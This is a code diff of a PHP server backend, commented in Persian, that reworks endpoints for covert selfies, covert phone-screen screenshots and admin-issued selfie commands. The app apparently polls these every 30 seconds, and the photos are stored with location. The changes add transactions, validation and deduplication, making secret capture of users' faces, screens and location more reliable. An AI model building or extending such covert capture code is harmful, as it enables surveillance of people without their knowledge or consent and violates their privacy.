@@ -6826,15 +6826,39 @@ route('GET', '/api/cron/auto-exit', function($p,$b,$u){
 // دریافت سلفی نامحسوس از اپ
 route('POST', '/api/my/covert-selfie', function($p,$b,$u){
   if (empty($b['photo'])) Http::error('تصویر ارسال نشده', 400);
-  $_covPath = Media::saveBase64($b['photo'], 'covert', 960, 65);
+  $requestId = (int)($b['request_id'] ?? 0);
+  $commandId = (int)($b['command_id'] ?? 0);
+  if ($requestId < 0 || $commandId < 0 || ($requestId && $commandId)) Http::error('شناسه درخواست معتبر نیست',422);
+  $reason = $requestId ? 'sr:'.$requestId : ($commandId ? 'sc:'.$commandId : ($b['reason']??'periodic'));
+  if (!$requestId && !$commandId && preg_match('/^s[rc]:/',(string)$reason)) Http::error('شناسه درخواست لازم است',422);
+  $pdo = Db::pdo();
+  $path = null;
+  $pdo->beginTransaction();
   try {
+    if ($requestId || $commandId) {
+      $target = $requestId
+        ? Db::one("SELECT csr.id,csr.expires_at FROM covert_selfie_requests csr JOIN users us ON us.id=? WHERE csr.id=? AND (csr.target_user_id=us.id OR csr.target_role_id=us.role_id OR csr.target_zone_id=us.zone_id) FOR UPDATE",[$u['id'],$requestId])
+        : Db::one("SELECT id FROM covert_selfie_commands WHERE id=? AND user_id=? AND reason<>'screenshot' FOR UPDATE",[$commandId,$u['id']]);
+      if (!$target) throw new RuntimeException('درخواست برای این کاربر یافت نشد',403);
+      $existing = Db::one('SELECT id FROM covert_selfies WHERE user_id=? AND reason=? LIMIT 1',[$u['id'],$reason]);
+      if ($existing) { $pdo->commit(); return ['ok'=>true,'id'=>(int)$existing['id']]; }
+      if ($requestId && strtotime($target['expires_at']) <= time()) throw new RuntimeException('مهلت درخواست پایان یافته است',409);
+    }
+    $path = Media::saveBase64($b['photo'], 'covert', 960, 65);
+    if (!$path) throw new RuntimeException('ذخیره تصویر ناموفق بود؛ دوباره تلاش کنید',500);
     $id = Db::insert("INSERT INTO covert_selfies(user_id,photo_path,lat,lng,reason) VALUES(?,?,?,?,?)",
-      [$u['id'], $_covPath, $b['lat']??null, $b['lng']??null, $b['reason']??'periodic']);
-  } catch (\Throwable $e) {
-    $id = Db::insert("INSERT INTO covert_selfies(user_id,photo_data,lat,lng,reason) VALUES(?,?,?,?,?)",
-      [$u['id'], $b['photo'], $b['lat']??null, $b['lng']??null, $b['reason']??'periodic']);
+      [$u['id'], $path, $b['lat']??null, $b['lng']??null, $reason]);
+    if ($requestId) Db::run('UPDATE covert_selfie_requests SET fulfilled_count=fulfilled_count+1 WHERE id=?',[$requestId]);
+    if ($commandId) Db::run('UPDATE covert_selfie_commands SET delivered_at=NOW() WHERE id=? AND user_id=?',[$commandId,$u['id']]);
+    $pdo->commit();
+    return ['id'=>$id, 'ok'=>true];
+  } catch (\Throwable $error) {
+    if ($pdo->inTransaction()) $pdo->rollBack();
+    if ($path) Media::delete($path);
+    error_log('Selfie persistence failed: '.$error->getMessage());
+    $status = $error instanceof RuntimeException ? (int)$error->getCode() : 500;
+    Http::error(in_array($status,[403,409],true) ? $error->getMessage() : 'ثبت تصویر ناموفق بود؛ دوباره تلاش کنید',in_array($status,[403,409],true)?$status:500);
   }
-  return ['id'=>$id, 'ok'=>true];
 });
 // ارسال اسکرین‌شات نامحسوس از صفحهٔ گوشی (ذخیره در همان جدول covert_selfies با reason=screenshot)
 route('POST', '/api/my/covert-screenshot', function($p,$b,$u){
@@ -6874,8 +6898,7 @@ route('GET', '/api/admin/covert-selfies/{id}/image', function($p,$b,$u){
 // دریافت دستورات سلفی فوری برای کاربر جاری (polling از اپ هر ۳۰ ثانیه)
 route('GET', '/api/my/selfie-commands', function($p,$b,$u){
   try {
-    $cmds = Db::all("SELECT id FROM covert_selfie_commands WHERE user_id=? AND delivered_at IS NULL ORDER BY id DESC LIMIT 5", [$u['id']]);
-    if ($cmds) { $ids = array_column($cmds,'id'); $in = implode(',',array_fill(0,count($ids),'?')); Db::run("UPDATE covert_selfie_commands SET delivered_at=NOW() WHERE id IN ($in)", $ids); }
+    $cmds = Db::all("SELECT id FROM covert_selfie_commands WHERE user_id=? AND reason<>'screenshot' AND delivered_at IS NULL ORDER BY id ASC LIMIT 5", [$u['id']]);
     return $cmds ?: [];
   } catch (\Throwable $e) { return []; }
 }, false);
@@ -6945,16 +6968,18 @@ route('POST', '/api/admin/covert-selfie-request', function($p,$b,$u){
 // اپ poll می‌کند آیا درخواستی برای این کاربر وجود دارد
 route('GET', '/api/my/covert-selfie-request', function($p,$b,$u){
   $r = Db::one("SELECT csr.id, csr.note FROM covert_selfie_requests csr
-    WHERE csr.expires_at > NOW() AND csr.fulfilled_count = 0
+    WHERE csr.expires_at > NOW()
+    AND NOT EXISTS (SELECT 1 FROM covert_selfies cs WHERE cs.user_id=? AND cs.reason=CONCAT('sr:',csr.id))
     AND (csr.target_user_id = ? OR
          (csr.target_role_id IS NOT NULL AND csr.target_role_id = (SELECT role_id FROM users WHERE id=?)) OR
          (csr.target_zone_id IS NOT NULL AND csr.target_zone_id = (SELECT zone_id FROM users WHERE id=?)))
-    ORDER BY csr.requested_at DESC LIMIT 1", [$u['id'], $u['id'], $u['id']]);
+    ORDER BY csr.requested_at ASC,csr.id ASC LIMIT 1", [$u['id'], $u['id'], $u['id'], $u['id']]);
   return $r ?: ['id'=>null];
 });
 // اپ پس از گرفتن سلفی، fulfilled می‌کند
 route('POST', '/api/my/covert-selfie-request/{id}/fulfill', function($p,$b,$u){
-  Db::run("UPDATE covert_selfie_requests SET fulfilled_count=fulfilled_count+1 WHERE id=?", [$p['id']]);
+  $photo = Db::one('SELECT id FROM covert_selfies WHERE id=? AND user_id=? AND reason=?',[(int)($b['selfie_id']??0),$u['id'],'sr:'.(int)$p['id']]);
+  if (!$photo) Http::error('ابتدا باید تصویر درخواست در سرور ثبت شود',409);
   return ['ok'=>true];
 });
 route('GET', '/api/admin/tracking-windows', function($p,$b,$u){
